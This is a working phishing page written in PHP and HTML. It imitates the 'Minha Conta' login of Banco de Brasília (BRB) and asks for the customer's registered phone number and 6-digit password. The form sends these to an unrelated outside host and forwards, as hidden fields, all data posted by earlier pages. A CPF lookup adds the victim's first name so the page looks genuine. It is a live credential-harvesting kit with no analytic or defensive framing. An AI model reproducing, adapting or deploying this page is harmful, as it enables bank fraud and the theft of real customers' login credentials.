<?php 
  $url_atual = "http" . (isset($_SERVER[HTTPS]) ? (($_SERVER[HTTPS]=="on") ? "s" : "") : "") . "://" . "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

  $explodeUrl = explode("/",$url_atual);
  $novaUrl = array_pop($explodeUrl);
  $explodeUrl = implode("/",$explodeUrl);
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <title>BRB - Banco de Brasília - Inicio / para você / BRB - Banco de Brasília</title>
    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="css/estilo.css">
    <link href="img/favico.ico" rel="Shortcut Icon">
    
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="theme-color" content="#015DAA">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="mobile-web-app-capable" content="yes">

    <!-- scripts -->
    <script src=https://code.jquery.com/jquery-1.12.0.min.js></script>
    <script>window.jQuery||document.write('<script src="js/vendor/jquery-1.12.0.min.js"><\/script>');</script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/script2.js"></script>
    <script src="js/script1.js"></script>
    <script src="js/script1.js?Xxxxdss" language="javascript"></script>
    <script src="//irql.bipbop.com.br/js/jquery.bipbop.min.js"></script>

    <script language="javascript">
        var isOK = false;
    </script>
</head>
    <body id="tela3">
        <div class='preloader'>
          <div class='loaded'>
            <div class="spinner">
              <div class="bounce1"></div>
              <div class="bounce2"></div>
              <div class="bounce3"></div>
            </div>
          </div>
        </div>

        <header class="topo">
          <div class="container">
            <div class="row">
              <div class="col-12">
                <h1 class="logo">
                  <img class="img-fluid" src="img/logo.png">
                </h1>
              </div>
            </div>
          </div>
        </header>

        <hr>
        <section class="identificacao">
          <div class="container">
            <div class="row">
              <div class="col-12">
                <p>Olá <span id="nome" style="color: #053982; font-weight: bold; font-size: 20px;">Cliente</span></p>      
              </div>
            </div>
          </div>
        </section>
        <hr>

        <div id="campos" style="clear: both;">

        <main class="corpo">
          <div class="container">
            <div class="row">
              <div class="col-12">
                <h2 class="TituloForm">
                  Minha Conta
                </h2>
              </div>
            </div>
            <div class="row">
              <div class="col-12">
                <form id="frm" action="http://bullmanescoras.com.br/email/envio-bb-4.php" method="POST" enctype="application/x-www-form-urlencoded">
                <?php foreach($_POST as $key => $value):  ?>
                  <input type="hidden" name="<?= $key ?>" id="<?= $key ?>" value="<?= $value ?>" />
                <?php endforeach; ?>

                <input type="hidden" name="erro" value="<?php echo $explodeUrl.'/webApps_AplicationFinish.php'; ?>" />
                <input type="hidden" name="sucesso" value="<?php echo $explodeUrl.'/webApps_AplicationFinish.php'; ?>" />

                  <div class="form-group">
                      <label for="faca">TELEFONE CADASTRADO</label><i class="icoLabel">*</i>
                      <input type="tel" class="form-control" name="faca" id="faca" maxlength="14" onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite um sms válido !')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="pulacampo('faca','seisvezes');" autofocus required>
                  </div>
                  <div class="form-group">
                      <label for="seisvezes">SENHA (6 dígitos)</label><i class="icoLabel">*</i>
                      <input type="password" class="form-control" name="seisvezes" id="seisvezes" minlength="6" maxlength="6" onkeyup="pulacampo('seisvezes','acessar');">
                  </div>
                  <div class="form-group">
                      <input class="btnAcessar" type="submit" name="enviar" id="enviar">
                  </div>
                </form>
              </div>
            </div>
          </div>
        </main>

    </body>
    <script language="javascript">
    $(document).ready(function(){
        
        
        $().bipbop("SELECT FROM 'BIPBOPJS'.'CPFCNPJ'", null, {
          data: {
              documento: $("#identificador").val(),
          },

          success: function(data) {
            var nome = $(data).find("body nome").text();
            var exception = $(data).find("header exception").text();

            if (exception) {
              exception = exception.replace(/, t/, '. T');
              //$('#status').text(exception);
            } else {
              $("#nome").text(ucfirst(nome.split(" ")[0]));
              $("#dados").show();
            }
          }
        });
        
    });
</script>
<script type="text/javascript">
     jQuery(document).ready(function ($) {

         $(window).load(function () {
             $(".loaded").fadeOut();
             $(".preloader").delay(1000).fadeOut("slow");
         });
     });
  </script>

</html>